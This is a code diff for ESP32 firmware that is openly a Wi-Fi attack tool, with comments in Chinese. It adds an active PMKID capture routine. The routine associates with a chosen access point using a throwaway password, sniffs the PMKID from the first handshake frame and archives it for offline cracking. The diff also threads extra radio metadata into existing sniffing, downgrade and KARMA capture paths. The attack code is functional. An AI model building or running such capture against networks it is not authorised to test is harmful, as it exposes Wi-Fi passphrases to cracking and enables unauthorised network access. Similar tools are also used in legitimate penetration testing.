@@ -587,7 +587,7 @@ static void wifi_sniff_cb(void *buf, wifi_promiscuous_pkt_type_t type)
 {
     /* state != SNIFF/DOWNGRADE 表示已停止, 丢弃后续包 */
     wifi_atk_state_t st = atomic_load(&s_state);
-    if (st != WIFI_ATK_SNIFF && st != WIFI_ATK_DOWNGRADE) return;
+    if (st != WIFI_ATK_SNIFF && st != WIFI_ATK_DOWNGRADE && st != WIFI_ATK_PMKID) return;
     if (!buf || type == WIFI_PKT_MISC) return;
 
     const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
@@ -606,7 +606,8 @@ static void wifi_sniff_cb(void *buf, wifi_promiscuous_pkt_type_t type)
     /* DOWNGRADE 模式: 只抓 EAPOL 4-way, 不打 PKT 行 (避免刷屏) */
     if (st == WIFI_ATK_DOWNGRADE) {
         /* 落盘: 降级模式正是要抓握手, 原始帧必须留一份 */
-        cap_feed(f, (uint16_t)frame_len, rssi, atomic_load(&s_sniff_channel));
+        cap_feed(f, (uint16_t)frame_len, rssi, atomic_load(&s_sniff_channel),
+                 (int8_t)p->rx_ctrl.noise_floor, (uint8_t)p->rx_ctrl.rate);
         hs_feed(f, (uint16_t)frame_len, rssi, atomic_load(&s_sniff_channel));
         if (ftype == FC_TYPE_DATA) {
             wifi_db_update_client(f, frame_len, rssi);
@@ -620,6 +621,15 @@ static void wifi_sniff_cb(void *buf, wifi_promiscuous_pkt_type_t type)
                 rgb_led_pulse(80, 80, 80, 0);
             }
         }
+        return;
+    }
+
+    /* PMKID 模式: 只喂抓包与握手归档, 不做入库/统计 (关联过程只有几帧) */
+    if (st == WIFI_ATK_PMKID) {
+        const uint8_t pch = atomic_load(&s_sniff_channel);
+        cap_feed(f, (uint16_t)frame_len, rssi, pch,
+                 (int8_t)p->rx_ctrl.noise_floor, (uint8_t)p->rx_ctrl.rate);
+        hs_feed(f, (uint16_t)frame_len, rssi, pch);
         return;
     }
 
@@ -660,7 +670,8 @@ static void wifi_sniff_cb(void *buf, wifi_promiscuous_pkt_type_t type)
     }
 
     /* 原始帧落盘: 只做分类 + memcpy 进 PSRAM 暂存环, 绝不碰 flash */
-    cap_feed(f, (uint16_t)frame_len, rssi, atomic_load(&s_sniff_channel));
+    cap_feed(f, (uint16_t)frame_len, rssi, atomic_load(&s_sniff_channel),
+             (int8_t)p->rx_ctrl.noise_floor, (uint8_t)p->rx_ctrl.rate);
     /* EAPOL 握手归档: 同样只做分类 + 拷贝 */
     hs_feed(f, (uint16_t)frame_len, rssi, atomic_load(&s_sniff_channel));
     /* KARMA: 收集 Probe Request 里客户端在找的 SSID */
@@ -888,6 +899,65 @@ esp_err_t wifi_attack_init(void)
     ESP_LOGI(TAG, "Wi-Fi init ok (STA, PS_NONE)");
     rgb_led_set_status(RGB_IDLE);
     return ESP_OK;
+}
+
+esp_err_t wifi_attack_pmkid_active(const uint8_t bssid[6], const char *ssid,
+                                   uint8_t ch, uint32_t timeout_ms,
+                                   int *m1_out, int *pmkid_out)
+{
+    if (!bssid || !ssid || !ssid[0]) return ESP_ERR_INVALID_ARG;
+    if (!is_valid_channel(ch)) return ESP_ERR_INVALID_ARG;
+
+    wifi_attack_stop_all();
+    if (atomic_load(&s_state) != WIFI_ATK_IDLE) return ESP_ERR_INVALID_STATE;
+
+    esp_err_t e = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+    if (e != ESP_OK) return e;
+    atomic_store(&s_sniff_channel, ch);
+
+    wifi_config_t cfg;
+    memset(&cfg, 0, sizeof(cfg));
+    snprintf((char *)cfg.sta.ssid, sizeof(cfg.sta.ssid), "%s", ssid);
+    /* 口令随便填, 只要长度过 8: supplicant 在本地就校验长度, 太短根本不发 assoc.
+     * PMKID 在 AP 发来的 M1 的 KDE 里, 不需要我们算对 MIC. */
+    snprintf((char *)cfg.sta.password, sizeof(cfg.sta.password), "%s", "rftool-pmkid-0000");
+    cfg.sta.bssid_set = 1;
+    memcpy(cfg.sta.bssid, bssid, 6);
+    cfg.sta.channel = ch;
+    cfg.sta.pmf_cfg.capable  = true;
+    cfg.sta.pmf_cfg.required = false;
+
+    e = esp_wifi_set_config(WIFI_IF_STA, &cfg);
+    if (e != ESP_OK) return e;
+
+    int before = hs_count();
+    int before_pmkid = hs_pmkid_count();
+
+    atomic_store(&s_state, WIFI_ATK_PMKID);
+    esp_wifi_set_promiscuous_rx_cb(wifi_sniff_cb);
+    esp_wifi_set_promiscuous(true);
+
+    e = esp_wifi_connect();
+    if (e != ESP_OK) {
+        esp_wifi_set_promiscuous(false);
+        atomic_store(&s_state, WIFI_ATK_IDLE);
+        return e;
+    }
+
+    TickType_t t0 = xTaskGetTickCount();
+    while ((xTaskGetTickCount() - t0) < pdMS_TO_TICKS(timeout_ms)) {
+        if (hs_pmkid_count() > before_pmkid) break;    /* 拿到就不用等满 */
+        vTaskDelay(pdMS_TO_TICKS(50));
+    }
+
+    esp_wifi_disconnect();
+    vTaskDelay(pdMS_TO_TICKS(150));   /* 最后一帧可能还在驱动队列里 */
+    esp_wifi_set_promiscuous(false);
+    atomic_store(&s_state, WIFI_ATK_IDLE);
+
+    if (m1_out)    *m1_out    = hs_count() - before;
+    if (pmkid_out) *pmkid_out = hs_pmkid_count() - before_pmkid;
+    return (hs_count() > before) ? ESP_OK : ESP_ERR_TIMEOUT;
 }
 
 esp_err_t wifi_attack_sniff_start(uint8_t channel, uint32_t count)
@@ -1156,13 +1226,18 @@ void wifi_attack_status(void)
     wifi_atk_state_t st = atomic_load(&s_state);
     const char *stname = (st == WIFI_ATK_SNIFF)      ? "SNIFF"     :
                          (st == WIFI_ATK_INJECT)     ? "INJECT"    :
-                         (st == WIFI_ATK_DOWNGRADE)  ? "DOWNGRADE" : "IDLE";
+                         (st == WIFI_ATK_DOWNGRADE)  ? "DOWNGRADE" :
+                         (st == WIFI_ATK_PMKID)      ? "PMKID"     : "IDLE";
     bool auto_ch = atomic_load(&s_channel_rotate);
+    uint8_t mac[6] = {0};
+    char macs[18] = "-";
+    if (esp_wifi_get_mac(WIFI_IF_STA, mac) == ESP_OK) mac_to_str(mac, macs);
     /* tasks: 当前任务数. 它是任务泄漏类缺陷的唯一可观测指标:
      * 进度任务 / 信道轮询任务一旦在" 停→立刻再开" 时重复起来, 任务数会
      * 逐轮累加, 别的读数(META 行、堆)全都看不出来. */
     printf("META,WIFI,STATUS,state,%s,channel,%u,auto_ch,%u,sniff_total,%u,"
-           "inject_total,%u,aps,%u,clients,%u,eapols,%u,mtu,%u,ble,%u,phy,%u,tasks,%u\n",
+           "inject_total,%u,aps,%u,clients,%u,eapols,%u,mtu,%u,ble,%u,phy,%u,tasks,%u,"
+           "sta_mac,%s\n",
            stname,
            (unsigned)atomic_load(&s_sniff_channel),
            auto_ch ? 1u : 0u,
@@ -1173,7 +1248,7 @@ void wifi_attack_status(void)
            (unsigned)wifi_db_eapol_count(),
            (unsigned)ble_cli_mtu(), ble_cli_connected() ? 1u : 0u,
            (unsigned)ble_cli_phy(),
-           (unsigned)uxTaskGetNumberOfTasks());
+           (unsigned)uxTaskGetNumberOfTasks(), macs);
     if (auto_ch) wifi_attack_auto_dump();
     fflush(stdout);
 }
